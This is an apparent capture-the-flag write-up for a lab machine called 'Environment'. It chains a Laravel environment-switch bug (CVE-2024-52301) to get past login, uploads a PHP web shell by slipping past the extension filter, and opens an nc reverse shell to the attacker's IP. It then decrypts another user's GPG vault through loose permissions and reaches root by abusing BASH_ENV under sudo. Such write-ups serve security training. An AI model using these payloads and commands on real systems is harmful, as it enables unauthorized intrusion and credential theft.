To start, we will perform a **quick port scan** using the [**Nmap**](https://nmap.org/) tool to see which ports are open.

```
sudo nmap -sS -p- -n -Pn -vvv 10.10.11.67
```

![1](/images/writeups/environment/1.png)

Knowing that ports **22** and **80** are open, we will perform a more **detailed scan** on these.

```
sudo nmap -sCV -p22,80 -n -Pn 10.10.11.67 -oN target
```

![2](/images/writeups/environment/2.png)

When accessing the website, we don‚Äôt see much.

> üìù**NOTE**: I have added the domain **environment.htb** with its **IP** in ***/etc/hosts***.

![3](/images/writeups/environment/3.png)

Therefore, we will **enumerate directories** and **files** using [**Feroxbuster**](https://github.com/epi052/feroxbuster) to see what might be hidden on the web.

```
feroxbuster -u http://environment.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --filter-status 403,404
```

![4](/images/writeups/environment/4.png)

When accessing ***/upload***, we see **code errors** and that the website uses [**Laravel**](https://laravel.com/) (a **PHP framework**) with a version that is **vulnerable**. [**CVE-2024-52301**](https://github.com/Nyamort/CVE-2024-52301)

![5](/images/writeups/environment/5.png)

This vulnerability allows an attacker to **make the application think it is running in a different environment** (like ‚Äú**production**‚Äù or ‚Äú**development**‚Äù) using the **URL**, which can change what is displayed on the website.
We will test it with:

```
http://environment.htb/?--env=test
```

![6](/images/writeups/environment/6.png)

We continue exploring other paths to see if we can find something more useful.

The interesting part is found on the ***/login*** page.

![7](/images/writeups/environment/7.png)

If we intercept the request with [**Burp Suite**](https://portswigger.net/burp/communitydownload) and leave the ‚Äú**remember**‚Äù field empty, submitting the request will trigger a code error.

![8](/images/writeups/environment/8.png)

![9](/images/writeups/environment/9.png)

As we can see, if we change the **environment** to ‚Äú**preprod**‚Äù, it gives us a session as the **user with ID 1** and redirects us to ***/management/dashboard***. Since **Laravel** is vulnerable to changing the environment name, we can access it without issues.

![10](/images/writeups/environment/10.png)

![11](/images/writeups/environment/11.png)

We are logged in as **Hish**, but we don‚Äôt find any direct way to access the machine. For now, the only available **attack vector** is **uploading Hish‚Äôs profile picture**.

![12](/images/writeups/environment/12.png)

First, we test if we can **upload an image**, and it works without issues.

![13](/images/writeups/environment/13.png)

Now, the challenge is to **upload a malicious file** that allows **code execution**, making it appear as an image to the website, even though it actually contains **PHP code**.

We could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:

```
<?php
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

![14](/images/writeups/environment/14.png)

![15](/images/writeups/environment/15.png)

We managed to upload it by bypassing with "**cmd.php.**". This probably works because **the upload filter only checks the final extension**, and by adding the extra dot, the file passes validation, even though **PHP** interprets it normally. Now we can try executing commands on the server through the uploaded file‚Äôs **URL**.

![16](/images/writeups/environment/16.png)

We execute a **Reverse Shell** and access the machine.

```
http://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444
```

![17](/images/writeups/environment/17.png)

## Privilege escalation to Hish

If we navigate to **hish**‚Äôs folder, we can read the **User Flag**. We also see a folder called **backup**.

![18](/images/writeups/environment/18.png)

Inside the **backup** folder, there is a file called ***keyvault.gpg***, which is an **encrypted GPG file** that could contain sensitive information such as **keys**, **passwords**, or important **configuration data**.

![19](/images/writeups/environment/19.png)

A user‚Äôs **GPG keys** are usually stored in their home directory, inside a hidden folder called **.gnupg**. This folder contains both **public and private keys**, the trust database, and **GPG configuration**. Only the owning **user** and **root** should normally have access.

![20](/images/writeups/environment/20.png)

This is **vulnerable** because the **.gnupg** directory has too permissive permissions, **any user on the system can read its contents and enter it**, even if they cannot modify it. Since **private keys** and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of ***keyvault.gpg***.

To do this, we copy the entire **.gnupg** content to a directory where we have write permissions, such as ***/tmp***, and then we can use that directory as the `--homedir` for the **gpg** command. This allows us to access the user‚Äôs keys and perform **encryption** or **decryption** operations without being the original directory owner.

```
cd /tmp && mkdir gnupg
cp -r /home/hish/.gnupg/* ./gnupg
gpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg 
```

![21](/images/writeups/environment/21.png)

And we succeed in getting the **password** for the user **Hish** on this machine.

## Privilege escalation to Root

Running `sudo -l`, we see that we can execute the ***systeminfo*** script as any user without needing to provide a password.

![22](/images/writeups/environment/22.png)


Script contents:

```
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

As we can see, this script doesn‚Äôt contain anything interesting and doesn‚Äôt allow privilege escalation. The interesting part is the `BASH_ENV` variable, which *Bash* uses to run a script when starting a shell that is non-interactive, that is, a shell that runs commands automatically without the user typing them. Since **sudo** preserves this variable, we can point it to our own script, and when we run `sudo /usr/bin/systeminfo`, **Bash** will execute our script **with root privileges**.

We create a **Bash script** in **Hish**‚Äôs home directory with the following content:

```
#!/bin/bash
/bin/bash
```

Then we assign the BASH_ENV variable pointing to our script:

```
export BASH_ENV=/home/hish/root.sh
```

When we execute `sudo /usr/bin/systeminfo`, **Bash** will automatically load our script, and we obtain a **shell** with **root** privileges.

![23](/images/writeups/environment/23.png)

We get the **Root Flag** and **complete the machine**!!
